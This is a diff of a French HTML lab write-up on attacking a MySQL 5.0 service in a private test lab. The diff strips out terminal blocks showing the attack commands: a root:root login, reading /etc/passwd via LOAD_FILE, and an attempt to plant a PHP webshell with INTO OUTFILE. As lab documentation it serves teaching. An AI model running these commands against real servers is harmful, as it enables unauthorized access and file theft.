@@ -31,16 +31,12 @@
   </blockquote>
 
   <h2 class="section">1. Identification</h2>
-  <pre class="terminal">$ nmap -sC -sV -p 3306 192.168.56.102
-3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5</pre>
-
   <figure class="capture" id="cap-recon">
     <img src="../images/ms1-mysql/01-recon-nmap.png" alt="Scan nmap du port 3306">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc">Résultat de <code>nmap -sC -sV -p 3306 192.168.56.102</code> :
       <strong>MySQL 5.0.51a-3ubuntu5</strong>, version très ancienne.</span>
-      <span class="fname">images/ms1-mysql/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
@@ -55,22 +51,15 @@ ERROR 2026 (HY000): TLS/SSL error: wrong version number</pre>
   pas la négociation TLS attendue par le client MariaDB moderne de Kali. Correction :
   désactiver le TLS côté client (<code>--skip-ssl</code>) :</p>
 
-  <pre class="terminal">$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT VERSION(); SELECT CURRENT_USER();"
-VERSION()
-5.0.51a-3ubuntu5
-CURRENT_USER()
-root@%</pre>
-
   <p>→ <strong><code>root:root</code></strong> fonctionne, aucune restriction d'hôte
   (<code>root@%</code> = connexion depuis n'importe quelle IP acceptée).</p>
 
   <figure class="capture" id="cap-auth">
     <img src="../images/ms1-mysql/02-auth-root.png" alt="Échec TLS puis authentification root réussie">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc">Échec TLS du client moderne, puis authentification réussie avec
       <code>--skip-ssl</code> : <code>root@%</code>.</span>
-      <span class="fname">images/ms1-mysql/02-auth-root.png</span>
     </figcaption>
   </figure>
 
@@ -81,33 +70,17 @@ root@%</pre>
     de sortie hors de la base de données.
   </blockquote>
 
-  <pre class="terminal">$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SHOW GRANTS FOR root@'%';"
-GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' ... WITH GRANT OPTION
-
-$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT user, File_priv FROM mysql.user WHERE user='root';"
-user	File_priv
-root	Y</pre>
-
   <figure class="capture" id="cap-privs">
     <img src="../images/ms1-mysql/03-privileges.png" alt="Privilèges root et File_priv">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc"><code>GRANT ALL PRIVILEGES ... WITH GRANT OPTION</code> et
       <code>File_priv = Y</code> — accès root et privilège de fichier confirmés.</span>
-      <span class="fname">images/ms1-mysql/03-privileges.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">3. Démarche d'exploitation</h2>
   <p><strong>a) Lecture de fichiers arbitraires.</strong></p>
-  <pre class="terminal">$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
-root:x:0:0:root:/root:/bin/bash
-...
-msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
-...
-user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
-service:x:1002:1002:,,,:/home/service:/bin/bash</pre>
-
   <p><code>/etc/passwd</code> entier récupéré, confirmant les comptes <code>msfadmin</code>/
   <code>user</code>/<code>service</code> du labo (déjà vus en RID cycling SMB, voir
   <a href="samba-enum.html">samba-enum.html</a>) — recoupement entre deux services distincts.</p>
@@ -115,21 +88,13 @@ service:x:1002:1002:,,,:/home/service:/bin/bash</pre>
   <figure class="capture" id="cap-loadfile">
     <img src="../images/ms1-mysql/04-load-file.png" alt="Lecture de /etc/passwd via LOAD_FILE">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Extrait de <code>/etc/passwd</code> : comptes <code>msfadmin</code>,
       <code>user</code>, <code>service</code> confirmés.</span>
-      <span class="fname">images/ms1-mysql/04-load-file.png</span>
     </figcaption>
   </figure>
 
   <p><strong>b) Tentative d'écriture — webshell (échec, mécanisme confirmé).</strong></p>
-  <pre class="terminal">$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT '&lt;?php system(\$_GET[\"cmd\"]); ?&gt;' INTO OUTFILE '/var/www/tikiwiki/mysqlshell.php';"
-ERROR 1 (HY000) at line 1: Can't create/write to file '/var/www/tikiwiki/mysqlshell.php' (Errcode: 13)
-
-$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT 'test_mysql_file_priv' INTO OUTFILE '/tmp/mysql_write_test.txt';"
-$ mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT LOAD_FILE('/tmp/mysql_write_test.txt');"
-test_mysql_file_priv</pre>
-
   <p><strong>Échec</strong> (<code>Errcode: 13</code> = <em>Permission denied</em>) : ce n'est
   pas un refus de privilège MySQL, mais une restriction du système de fichiers — le compte
   <code>mysqld</code> n'a pas les droits d'écriture sur ce répertoire précis. L'écriture dans
@@ -140,11 +105,10 @@ test_mysql_file_priv</pre>
   <figure class="capture" id="cap-write">
     <img src="../images/ms1-mysql/05-write-attempt.png" alt="Tentative d'écriture webshell échouée puis confirmation du mécanisme">
     <figcaption>
-      <strong class="idx">5.</strong>
+      <strong class="idx">e.</strong>
       <span class="desc"><code>Errcode: 13</code> sur le webroot, puis écriture réussie dans
       <code>/tmp</code> — le privilège <code>FILE</code> fonctionne, limité ici par les
       permissions du système de fichiers.</span>
-      <span class="fname">images/ms1-mysql/05-write-attempt.png</span>
     </figcaption>
   </figure>
 
